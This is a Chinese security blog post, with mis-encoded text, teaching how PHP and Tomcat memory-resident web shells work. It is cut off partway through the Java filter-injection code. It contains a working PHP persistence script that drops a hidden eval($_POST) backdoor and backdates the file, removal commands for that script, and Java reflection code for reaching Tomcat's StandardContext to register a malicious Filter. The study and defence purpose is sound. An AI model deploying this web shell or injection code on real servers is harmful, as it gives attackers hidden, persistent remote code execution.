<!-- build time:Thu Jan 18 2024 13:22:55 GMT+0800 (China Standard Time) --><!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" title="ä½™æ˜Ÿé…’" href="http://example.com/rss.xml"><link rel="alternate" type="application/atom+xml" title="ä½™æ˜Ÿé…’" href="http://example.com/atom.xml"><link rel="alternate" type="application/json" title="ä½™æ˜Ÿé…’" href="http://example.com/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><meta name="keywords" content="Javaä»£ç å®¡è®¡,Javaå®‰å…¨åŸºç¡€ç¯‡"><link rel="canonical" href="http://example.com/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/"><title>Tomcatå†…å­˜é©¬ - Javaå®‰å…¨åŸºç¡€ - ä»£ç å®¡è®¡ | ä½™æ˜Ÿé…’ = ä½™æ˜Ÿé…’ = ç—´çœ‹å¹´å°‘é£é›¨ç–¾ï¼Œä¸€è½¬æœ¬ç”Ÿè¹‰è·æ¸¸</title><meta name="generator" content="Hexo 6.3.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">Tomcatå†…å­˜é©¬</h1><div class="meta"><span class="item" title="åˆ›å»ºæ—¶é—´ï¼š2023-12-28 09:09:00"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">å‘è¡¨äº</span> <time itemprop="dateCreated datePublished" datetime="2023-12-28T09:09:00+08:00">2023-12-28</time></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="åˆ‡æ¢å¯¼èˆªæ "><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">ä½™æ˜Ÿé…’</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><ul><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gipeudstjqj20zk0m8k3r.jpg"></li><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giph4wqtg4j20zk0m8x6p.jpg"></li><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giciusoyjnj219g0u0x56.jpg"></li><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giclwuom7cj20zk0m8dvn.jpg"></li><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1giclxxcb6rj20zk0m8b29.jpg"></li><li class="item" data-background-image="https://tva3.sinaimg.cn/large/6833939bly1gicitcxhpij20zk0m8hdt.jpg"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">é¦–é¡µ</a></span><i class="ic i-angle-right"></i> <span itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" itemprop="item" rel="index" title="åˆ†ç±»äº ä»£ç å®¡è®¡"><span itemprop="name">ä»£ç å®¡è®¡</span></a><meta itemprop="position" content="1"></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/" itemprop="item" rel="index" title="åˆ†ç±»äº Javaå®‰å…¨åŸºç¡€"><span itemprop="name">Javaå®‰å…¨åŸºç¡€</span></a><meta itemprop="position" content="2"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="http://example.com/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.jpg"><meta itemprop="name" content="ä½™æ˜Ÿé…’"><meta itemprop="description" content="ç—´çœ‹å¹´å°‘é£é›¨ç–¾ï¼Œä¸€è½¬æœ¬ç”Ÿè¹‰è·æ¸¸, æ¬¢è¿å‚è§‚æˆ‘çš„ç¬”è®°ç©ºé—´ ~ è¿™é‡Œä¸»è¦ä¼šè®°å½•ä¸€äº›å®‰å…¨ç›¸å…³çš„å­¦ä¹ ç¬”è®° ğŸŒ¸"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="ä½™æ˜Ÿé…’"></span><div class="body md" itemprop="articleBody"><h1 id="phpå†…å­˜é©¬"><a href="#phpå†…å­˜é©¬" class="headerlink" title="phpå†…å­˜é©¬"></a>phpå†…å­˜é©¬</h1><p>phpå†…å­˜é©¬çš„å®ç°è¿‡ç¨‹</p><pre><code class="php">&lt;?php
  ignore_user_abort(true); //ignore_user_abortå¦‚æœè®¾ç½®ä¸º TRUEï¼Œåˆ™å¿½ç•¥ä¸ç”¨æˆ·çš„æ–­å¼€,è„šæœ¬å°†ç»§ç»­è¿è¡Œã€‚
  set_time_limit(0); //PHPè„šæœ¬é™åˆ¶äº†æ‰§è¡Œæ—¶é—´ï¼Œset_time_limit(0)è®¾ç½®ä¸€ä¸ªè„šæœ¬çš„æ‰§è¡Œæ—¶é—´ä¸ºæ— é™é•¿
  unlink(__FILE__); //åˆ é™¤è‡ªèº«
  $file = &#39;.config.php&#39;;
  $code = &#39;&lt;?php if(md5($_GET[&quot;pass&quot;])==&quot;1a1dc91c907325c69271ddf0c944bc72&quot;)
  &#123;@eval($_POST[a]);&#125; ?&gt;&#39;;
  while (1)&#123;
  file_put_contents($file,$code); //åˆ›å»ºshell.php
  system(&#39;touch -m -d &quot;2018-12-01 09:10:12&quot; .config.php&#39;);
  usleep(50); //é—´éš”æ—¶é—´
  &#125;
?&gt;
</code></pre><p>å¤§è‡´æ‰§è¡Œæµç¨‹å¦‚ä¸‹</p><ol><li>å°†æºå¸¦å¾ªç¯ç”Ÿæˆæœ¨é©¬çš„å‘½ä»¤è„šæœ¬ä¸Šä¼ åˆ°æœåŠ¡å™¨</li><li>åˆ é™¤æ–‡ä»¶æœ¬èº«</li><li>è®©å…¶ä»¥éšè—æ–‡ä»¶çš„æ–¹å¼ï¼Œæ­»å¾ªç¯åˆ›å»ºæ–‡ä»¶ï¼Œå¹¶å‘æ–‡ä»¶ä¸­å†™å…¥æœ¨é©¬<br>æ ¹æ®ä»£ç å±•ç¤ºå¾—å‡ºå®ƒçš„æ–‡ä»¶å<code>.config.php</code>æ™®é€šçš„<code>ls</code>æ— æ³•æŸ¥çœ‹ï¼Œå¿…é¡»é€šè¿‡<code>ls -lah</code>å¯ä»¥æŸ¥çœ‹</li></ol><h2 id="æŸ¥æ€phpå†…å­˜é©¬"><a href="#æŸ¥æ€phpå†…å­˜é©¬" class="headerlink" title="æŸ¥æ€phpå†…å­˜é©¬"></a>æŸ¥æ€phpå†…å­˜é©¬</h2><ol><li>é‡å¯phpæœåŠ¡å™¨ <code>service apache2 restart</code></li><li>å¼ºè¡Œkillåå°è¿›ç¨‹<code>ps aux | grep www-data | awk &#39;&#123;print $2&#125;&#39; | xargs kill -9</code></li><li>whileå¾ªç¯è„šæœ¬åˆ é™¤æ–‡ä»¶ <code>while :;do rm -rf .config.php; done</code></li><li>å»ºç«‹ä¸€ä¸ªå’Œä¸æ­»é©¬ç›¸åŒåå­—çš„æ–‡ä»¶æˆ–ç›®å½•ï¼Œä¸æ–­ç«äº‰å†™å…¥ä¸€ä¸ªå’Œä¸æ­»é©¬åŒåçš„æ–‡ä»¶</li></ol><pre><code class="php">&lt;?php
  while (1) &#123;
  $pid = ä¸æ­»é©¬çš„è¿›ç¨‹PID;
  @unlink(&quot;.ski12.php&quot;);
  exec(&quot;kill -9 $pid&quot;);
  usleep(20);
&#125;
?&gt;
</code></pre><p>æ ¹æ®phpæ¥ç±»æ¯”ä¸€ä¸‹java</p><ol><li>å†…å­˜é©¬æ— æ–‡ä»¶è½åœ°ï¼Œç”¨æˆ·æ— æ³•æµè§ˆåˆ°</li><li>æ–‡ä»¶ä¸æ­»ï¼Œèƒ½å¤Ÿå¾ªç¯æ‰§è¡Œ</li></ol><h1 id="javaå†…å­˜é©¬"><a href="#javaå†…å­˜é©¬" class="headerlink" title="javaå†…å­˜é©¬"></a>javaå†…å­˜é©¬</h1><h2 id="ç±»åŠ è½½è¿‡ç¨‹"><a href="#ç±»åŠ è½½è¿‡ç¨‹" class="headerlink" title="ç±»åŠ è½½è¿‡ç¨‹"></a>ç±»åŠ è½½è¿‡ç¨‹</h2><ol><li>æ‰§è¡Œ <code>new XXX()</code> æ—¶ä¼šè§¦å‘JVMåŠ è½½XXX.classæ–‡ä»¶</li><li>JVMä»æœ¬åœ°ç£ç›˜æ‰¾åˆ°XXX.classæ–‡ä»¶å¹¶åŠ è½½åˆ°JVMå†…å­˜ä¸­</li><li>.classæ–‡ä»¶åŠ è½½å…¥å†…å­˜åï¼ŒJVMä¼šè‡ªåŠ¨åˆ›å»ºä¸€ä¸ªclasså¯¹è±¡ï¼Œä¸€ä¸ªç±»åªä¼šäº§ç”Ÿä¸€ä¸ªclasså¯¹è±¡</li><li>å¾—åˆ°classå¯¹è±¡åï¼Œåå‘è·å–XXXå¯¹è±¡çš„å„ç§ä¿¡æ¯</li></ol><h3 id="åŒäº²å§”æ´¾æœºåˆ¶"><a href="#åŒäº²å§”æ´¾æœºåˆ¶" class="headerlink" title="åŒäº²å§”æ´¾æœºåˆ¶"></a>åŒäº²å§”æ´¾æœºåˆ¶</h3><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20231228095413483.png"><p>ä½†æ˜¯Tomcatä¸æ˜¯è¿™ç§æœºåˆ¶</p><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20231228095505861.png"><p>å› æ­¤åœ¨åˆ†ææŸäº›ç±»çš„æ—¶å€™ï¼Œè¦æŒ‰ç…§å¯¹åº”Tomcaté‡Œé¢å»åˆ†æ</p><h2 id="åˆ†ç±»"><a href="#åˆ†ç±»" class="headerlink" title="åˆ†ç±»"></a>åˆ†ç±»</h2><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20231228093815544.png"><blockquote><p>å®¢æˆ·ç«¯å‘èµ·çš„webè¯·æ±‚ä¼šä¾æ¬¡ç»è¿‡Listenerã€Filterã€Servletä¸‰ä¸ªç»„ä»¶ï¼Œåªè¦åœ¨è¿™ä¸ªè¯·æ±‚çš„è¿‡ç¨‹ä¸­åšæ‰‹è„šï¼Œåœ¨å†…å­˜ä¸­ä¿®æ”¹å·²æœ‰çš„ç»„ä»¶æˆ–è€…åŠ¨æ€æ³¨å†Œä¸€ä¸ªæ–°çš„ç»„ä»¶ï¼Œæ’å…¥æ¶æ„çš„shellcodeï¼Œå°±èƒ½å¤Ÿè¾¾åˆ°å†…å­˜é©¬çš„æ•ˆæœ<br>æ€»ç»“å°±æ˜¯<code>å¯¹è®¿é—®è·¯å¾„æ˜ å°„åŠç›¸å…³å¤„ç†ä»£ç çš„åŠ¨æ€æ³¨å†Œ</code></p></blockquote><p>æŒ‰ç…§ä½œç”¨çš„ä½ç½®åˆ†ä¸º</p><ol><li>listenerå†…å­˜é©¬</li><li>filterå†…å­˜é©¬</li><li>servletå†…å­˜é©¬<br>è¿™ä¸‰ç§ç»Ÿç§°ä¸ºservlet-apiå‹<br>åœ¨ç‰¹å®šæ¡†æ¶ä¸­ï¼ŒSpring&#x2F;Strust2ç­‰æ¡†æ¶ï¼ŒæŒ‰ç…§ä½ç½®åˆ†ä¸º</li><li>interceptorå‹</li><li>controllerå‹<br>åŒæ—¶é’ˆå¯¹ä¸åŒçš„ä¸­é—´ä»¶è¿˜å¯åˆ†ä¸º</li><li>Tomcatçš„Pipeline&amp;Valve</li><li>Grizzlyçš„FilterChain&amp;Filterç­‰ç­‰<br>æœ€åä¸€ç§æ˜¯å­—èŠ‚ç å¢å¼ºå‹å†…å­˜é©¬</li></ol><ul><li>java agentå†…å­˜é©¬<br>æœ€ç»ˆåˆ†ç±»</li></ul><ol><li>åŠ¨æ€æ³¨å†Œ servlet&#x2F;filter&#x2F;listenerï¼ˆä½¿ç”¨servlet-apiçš„å…·ä½“å®ç°ï¼‰</li><li>åŠ¨æ€æ³¨å†Œ interceptor&#x2F;controllerï¼ˆä½¿ç”¨æ¡†æ¶å¦‚spring&#x2F;struct2ï¼‰</li><li>åŠ¨æ€æ³¨å†Œä½¿ç”¨èŒè´£é“¾è®¾è®¡æ¨¡å¼çš„ä¸­é—´ä»¶ã€æ¡†æ¶çš„å®ç°ï¼ˆTomcatçš„Pipeline&amp;Valveã€Grizzlyçš„FilterChain&amp;Filterç­‰ï¼‰</li><li>ä½¿ç”¨Java AgentæŠ€æœ¯å†™å…¥å­—èŠ‚ç </li></ol><h1 id="Filterå†…å­˜é©¬"><a href="#Filterå†…å­˜é©¬" class="headerlink" title="Filterå†…å­˜é©¬"></a>Filterå†…å­˜é©¬</h1><p>Filterä¹Ÿç§°ä¸ºè¿‡æ»¤å™¨ï¼Œè¿‡æ»¤å™¨å®é™…ä¸Šå°±æ˜¯å¯¹webèµ„æºè¿›è¡Œæ‹¦æˆªï¼Œåšä¸€äº›è¿‡æ»¤ï¼Œæƒé™é‰´åˆ«ç­‰å¤„ç†åå†äº¤ç»™ä¸‹ä¸€ä¸ªè¿‡æ»¤å™¨æˆ–servletå¤„ç†ï¼Œé€šå¸¸éƒ½æ˜¯ç”¨æ¥æ‹¦æˆªrequestè¿›è¡Œå¤„ç†çš„ï¼Œä¹Ÿå¯ä»¥å¯¹è¿”å›çš„responseè¿›è¡Œæ‹¦æˆªå¤„ç†</p><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20231228095812652.png"><p>å½“å¤šä¸ªfilteråŒæ—¶å­˜åœ¨çš„æ—¶å€™ï¼Œç»„æˆäº†filteré“¾ï¼ŒwebæœåŠ¡å™¨æ ¹æ®filteråœ¨web.xmlæ–‡ä»¶ä¸­çš„æ³¨å†Œé¡ºåºï¼Œå†³å®šå…ˆè°ƒç”¨å“ªä¸ªfilterï¼Œç¬¬ä¸€ä¸ªfilterçš„<code>doFilter</code>æ–¹æ³•è¢«è°ƒç”¨æ—¶ï¼ŒwebæœåŠ¡å™¨ä¼šåˆ›å»ºä¸€ä¸ªä»£è¡¨Filteré“¾çš„<code>FilterChain</code>å¯¹è±¡ä¼ é€’ç»™è¯¥æ–¹æ³•ï¼Œåœ¨doFilteræ–¹æ³•ä¸­ï¼Œå¼€å‘äººå‘˜å¦‚æœè°ƒç”¨äº†FilterChainå¯¹è±¡çš„doFilteræ–¹æ³•ï¼Œåˆ™webæœåŠ¡å™¨ä¼šæ£€æŸ¥FilterChainå¯¹è±¡ä¸­æ˜¯å¦è¿˜æœ‰filterï¼Œå¦‚æœæœ‰ï¼Œåˆ™è°ƒç”¨ç¬¬äºŒä¸ªfilterï¼Œå¦‚æœæ²¡æœ‰ï¼Œåˆ™è°ƒç”¨ç›®æ ‡èµ„æº</p><h2 id="Filterç”Ÿå‘½å‘¨æœŸ"><a href="#Filterç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="Filterç”Ÿå‘½å‘¨æœŸ"></a>Filterç”Ÿå‘½å‘¨æœŸ</h2><pre><code class="java">public void init(FilterConfig filterConfig) throws ServletException   //åˆå§‹åŒ–
public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException;   //æ‹¦æˆªè¯·æ±‚
public void destroy();  //é”€æ¯
</code></pre><p>Filterå¯¹è±¡åˆ›å»ºåä¼šé©»ç•™åœ¨å†…å­˜ï¼Œå½“webåº”ç”¨ç§»é™¤æˆ–æœåŠ¡å™¨åœæ­¢æ—¶æ‰é”€æ¯ï¼Œåœ¨webå®¹å™¨å¸è½½Filterå¯¹è±¡ä¹‹å‰è¢«è°ƒç”¨ï¼Œè¯¥æ–¹æ³•åœ¨Filterçš„ç”Ÿå‘½å‘¨æœŸä¸­ä»…æ‰§è¡Œä¸€æ¬¡ï¼Œåœ¨è¿™ä¸ªæ–¹æ³•ä¸­ï¼Œå¯ä»¥é‡Šæ”¾è¿‡æ»¤å™¨ä½¿ç”¨çš„èµ„æº</p><h2 id="Filterç±»"><a href="#Filterç±»" class="headerlink" title="Filterç±»"></a>Filterç±»</h2><pre><code class="java">FilterDefs : å­˜æ”¾FilterDefçš„æ•°ç»„ï¼ŒFilterDefä¸­å­˜å‚¨è¿™æˆ‘ä»¬è¿‡æ»¤å™¨åï¼Œè¿‡æ»¤å™¨å®ä¾‹ç­‰åŸºæœ¬ä¿¡æ¯
FilterConfigs : å­˜æ”¾FilterConfigçš„æ•°ç»„ï¼Œåœ¨FilterConfigä¸­ä¸»è¦å­˜æ”¾FilterDefå’ŒFilterå¯¹è±¡ç­‰ä¿¡æ¯
FilterMaps : å­˜æ”¾FilterMapçš„æ•°ç»„ï¼Œåœ¨FilterMapä¸­ä¸»è¦å­˜æ”¾FilterNameå’Œå¯¹åº”çš„URLPattern
FilterChain : è¿‡æ»¤å™¨é“¾ï¼Œè¯¥å¯¹è±¡ä¸Šçš„doFilteræ–¹æ³•èƒ½ä¾æ¬¡è°ƒç”¨é“¾ä¸Šçš„Filter
ApplicationFilterChain : è°ƒç”¨è¿‡æ»¤å™¨é“¾
ApplicationFilterConfig : è·å–è¿‡æ»¤å™¨
ApplicationFilterFactory : ç»„è£…è¿‡æ»¤å™¨é“¾
WebXml : å­˜æ”¾web.xmlä¸­å†…å®¹çš„ç±»
ContextConfig : Webåº”ç”¨çš„ä¸Šä¸‹æ–‡é…ç½®ç±»
StandardContext : Contextæ¥å£çš„æ ‡å‡†å®ç°ç±»ï¼Œä¸€ä¸ªCOntextä»£è¡¨ä¸€ä¸ªWebåº”ç”¨ï¼Œå…¶ä¸‹å¯ä»¥åŒ…å«å¤šä¸ªWrapper
StandardWrapperValve : ä¸€ä¸ªWrapperçš„æ ‡å‡†å®ç°ç±»ï¼Œä¸€ä¸ªWrapperä»£è¡¨ä¸€ä¸ªServlet
</code></pre><h3 id="wrapperå’ŒContext"><a href="#wrapperå’ŒContext" class="headerlink" title="wrapperå’ŒContext"></a>wrapperå’ŒContext</h3><p>Servletæ˜¯javaæœ€åŸºæœ¬çš„åº”ç”¨ï¼Œè€ŒTomcatæ˜¯ä¸€ä¸ªå¤§çš„Servletå®¹å™¨ï¼Œtomcatä¸»è¦ç”±connectorè¿æ¥å™¨å’Œå®¹å™¨ç»„æˆï¼Œè¿™äº›å®¹å™¨æ˜¯çˆ¶å­å…³ç³»ï¼Œä¸æ˜¯å¹³è¡Œå…³ç³»</p><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20231228153522249.png"><p>å’ŒServletçš„æ–¹å¼ä¸åŒï¼ŒFilteråªèƒ½é€šè¿‡é…ç½®web.xmlæ¥å®ç°æ•ˆæœï¼ŒTomcatæ—¶é€šè¿‡ä»¥ä¸‹æ–¹æ³•æ¥å®ç°</p><ol><li>æ ¹æ®è¯·æ±‚çš„URLä»<code>FilterMaps</code>ä¸­æ‰¾å‡ºä¸ä¹‹URLå¯¹åº”çš„<code>FIlteråç§°</code></li><li>æ ¹æ®Filteråç§°å»<code>FilterConfigs</code>ä¸­æŸ¥æ‰¾å¯¹åº”åç§°çš„<code>FilterConfig</code></li><li>æ‰¾åˆ°å¯¹åº”çš„<code>FIlterConfig</code>ä¹‹åæ·»åŠ åˆ°<code>FIlterChain</code>ä¸­ï¼Œå¹¶ä¸”è¿”å›<code>FilterChain</code></li><li><code>FilterChain</code>ä¸­è°ƒç”¨<code>internalDoFilter</code>ä¾¿åˆ©è·å–<code>chain</code>ä¸­çš„<code>FilterConfig</code>ç„¶åä»<code>FilterConfig</code>ä¸­è·å–<code>Filter</code>ï¼Œç„¶åè°ƒç”¨Filterçš„<code>doFilter</code>æ–¹æ³•<br>ä½†æ˜¯åœ¨å®é™…è¿‡ç¨‹ä¸­ï¼Œæ— æ³•æ“æ§web.xmlï¼Œéœ€è¦ä½¿ç”¨åå°„å»åŠ¨æ€æ³¨å†Œ</li><li>åˆ›å»ºä¸€ä¸ªæ¶æ„çš„<code>Filter</code></li><li>åˆ©ç”¨<code>FilterDef</code>å¯¹<code>Filter</code>è¿›è¡Œä¸€ä¸ªå°è£…</li><li>å°†<code>FilterDef</code>æ·»åŠ åˆ°<code>FilterDefs</code>å’Œ<code>FilterConfig</code>ä¸­</li><li>åˆ›å»º<code>FilterMap</code>å°†åˆ›å»ºçš„FIlterå’Œurlpatternç›¸å¯¹åº”ï¼Œå­˜æ”¾åˆ°<code>FilterMaps</code>ä¸­(ç”±äºFilterç”Ÿæ•ˆä¼šæœ‰ä¸€ä¸ªå…ˆåé¡ºåºï¼Œæ‰€ä»¥ä¸€èˆ¬éƒ½æ˜¯æ”¾åœ¨æœ€å‰é¢ï¼Œè®©åˆ›å»ºçš„æ¶æ„FIlteræœ€å…ˆè§¦å‘)<br>æ•´ä¸ªæµç¨‹ä¸‹æ¥ï¼Œå¯ä»¥å‘ç°ç¨‹åºåœ¨åˆ›å»ºè¿‡æ»¤å™¨é“¾çš„æ—¶å€™ï¼Œcontextå˜é‡é‡Œé¢åŒ…å«äº†ä¸‰ä¸ªå’Œfilteræœ‰å…³çš„æˆå‘˜å˜é‡<code>filterConfigs</code>ã€<code>filterDefs</code>ã€<code>filterMaps</code></li></ol><p>ç°åœ¨è¦è§£å†³çš„é—®é¢˜å°±æ˜¯å¦‚ä½•è·å–è¿™ä¸ª<code>context</code>å¯¹è±¡ä»¥åŠå¦‚ä½•<code>ä¿®æ”¹è¿™ä¸‰ä¸ªå˜é‡</code>å°†<code>æ¶æ„ç±»æ’å…¥</code><br>Tomcatä¸­å¯¹åº”çš„<code>ServletContext</code>å®ç°æ˜¯<code>ApplicationContext</code></p><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20231228155508112.png"><p>åœ¨webåº”ç”¨ä¸­è·å–çš„ServletContextå®é™…ä¸Šæ˜¯ApplicationContextFacadeå¯¹è±¡ï¼Œå¯¹ApplicationContextè¿›è¡Œäº†å°è£…ï¼Œè€ŒApplicationContextå®ä¾‹ä¸­åˆåŒ…å«äº†StandContextå®ä¾‹ï¼Œä»¥æ­¤æ¥è·å–æ“ä½œTomcatå®¹å™¨å†…éƒ¨çš„ä¸€äº›ä¿¡æ¯ï¼Œå¦‚Servletçš„æ³¨å†Œç­‰</p><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20231228161739913.png"><p>å½“æˆ‘ä»¬èƒ½ç›´æ¥è·å–requestçš„æ—¶å€™ï¼Œå¯ä»¥ç›´æ¥å°†ServletContextè½¬ä¸ºStandardContextä»è€Œè·å–context</p><ol><li><code>ServeltContext =&gt; ApplicationContext</code></li></ol><pre><code class="java">ServletContext servletContext = request.getSession().getServletContext();
Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);
appctx.setAccessible(true);
ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
//ä¸Šé¢å‡ è¡Œçš„ç›®çš„æ˜¯ä¸ºäº†è·å–(ApplicationContext)context
</code></pre><p>é€šè¿‡Javaåå°„è·å–<code>servletContext</code>æ‰€å±çš„ç±»ï¼ˆServletContextå®é™…ä¸Šæ˜¯ApplicationContextFacadeå¯¹è±¡ï¼‰ä½¿ç”¨<code>getDeclaredField</code>æ ¹æ®æŒ‡å®šåç§°<code>context</code>è·å–ç±»çš„å±æ€§ï¼ˆ<code>private final org.apache.catalina.core.ApplicationContext</code>ï¼‰å› ä¸ºæ˜¯<code>private</code>ç±»å‹ï¼Œæ‰€ä»¥ä½¿ç”¨<code>setAccessible</code>å–æ¶ˆå¯¹æƒé™çš„æ£€æŸ¥ï¼Œå®ç°å¯¹ç§æœ‰çš„è®¿é—®</p><p><code>appctx</code>çš„å€¼</p><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20231228162612126.png"><ol start="2"><li><code>ApplicationContext =&gt; StandardContext</code> ApplicationContextå®ä¾‹ä¸­åŒ…å«äº†StandardContextå®ä¾‹</li></ol><pre><code class="java">Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);
stdctx.setAccessible(true);
StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
//ä¸Šé¢å‡ è¡Œçš„ç›®çš„æ˜¯ä¸ºäº†è·å–(StandradContext)context
</code></pre><p>é€šè¿‡Javaåå°„è·å–applicationContextæ‰€å±çš„ç±»(org.apache.catalina.core.ApplicationCOntext)ä½¿ç”¨getDeclaredFieldæ ¹æ®æŒ‡å®šåç§°contextè·å–ç±»çš„å±æ€§(private final org.apache.catelina.core.StandardContext)å’Œä¸Šé¢ä¸€æ ·ï¼Œéœ€è¦å–æ¶ˆå¯¹æƒé™çš„æ£€æŸ¥ï¼Œå®ç°å¯¹ç§æœ‰çš„è®¿é—®</p><p><code>stdctx</code>çš„å€¼</p><img data-src="/APT/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/image-20231228205107232.png"><p>è¿™æ ·å°±å¯ä»¥è·å–(StandardContext)contextå¯¹è±¡</p><pre><code class="java">ServletContext servletContext = request.getSession().getServletContext();
Field appctx = servletContext.getClass().getDeclaredField(&quot;context&quot;);
        appctx.setAccessible(true);
// ApplicationContext ä¸º ServletContext çš„å®ç°ç±»
        ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext);
        Field stdctx = applicationContext.getClass().getDeclaredField(&quot;context&quot;);
        stdctx.setAccessible(true);
